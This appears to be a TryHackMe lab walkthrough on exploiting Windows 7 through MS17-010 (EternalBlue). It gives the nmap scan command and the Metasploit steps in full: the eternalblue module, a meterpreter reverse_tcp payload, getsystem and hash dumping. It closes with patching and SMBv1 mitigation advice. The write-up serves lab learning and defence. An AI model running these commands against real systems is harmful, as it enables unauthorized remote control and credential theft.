# Exploiting Windows 7 with smb-vuln-ms17-010.nse on TryHackMe:

# Understanding MS17-010 (EternalBlue):

EternalBlue is a vulnerability in the Server Message Block (SMB) protocol that was exploited by the NSA and later leaked by the Shadow Brokers. Microsoft patched this vulnerability in March 2017 with the MS17-010 update. The vulnerability allows for remote code execution on vulnerable Windows systems.


# Step-by-Step Guide:

1. Scanning for Vulnerable Machines
Identify IP Address: Obtain the IP address of the target Windows 7 machine.

Use Nmap to scan for SMB:

* nmap -p 445 --script=smb-vuln-ms17-010 <Target-IP>

This will check if port 445 (SMB) is open and whether the target is vulnerable to MS17-010.

2. Setting Up Metasploit

Open Metasploit: On Kali Linux, open the terminal and start Metasploit:Search for the EternalBlue exploit:

* search eternalblue

Use the correct exploit module:

* use exploit/windows/smb/ms17_010_eternalblue


3. Configuring the Exploi:

Set the Target IP:

* set RHOSTS <Target-IP>

Set the Payload:

* set payload windows/x64/meterpreter/reverse_tcp

Set Local Host (Your Kali IP):

* set LHOST <Your-Kali-IP>


4. Exploiting the Vulnerability

Run the Exploit:

If successful, you will get a Meterpreter session, which is a powerful shell that allows you to control the target machine.

5. Post-Exploitation

System Information: Retrieve system info:

* sysinfo

Privilege Escalation: Check and elevate privileges if necessary:

 * getsystem

Interacting with the Target: Dump password hashes, capture screenshots, etc.

6. Clean Up
Terminate Sessions: Make sure to clean up by terminating any active sessions:

* exit

Close Metasploit:

* exit

# Mitigation & Prevention:

To protect against EternalBlue and similar vulnerabilities:

Apply Patches: Ensure that MS17-010 and other critical updates are applied.
Disable SMBv1: Consider disabling SMBv1 on all systems.
Network Segmentation: Isolate critical systems from the rest of the network.
Use Firewalls: Block unnecessary ports, such as 445, at the network perimeter.
Remember, this knowledge is intended to help secure systems and understand vulnerabilities. Unauthorized exploitation is illegal and unethical.




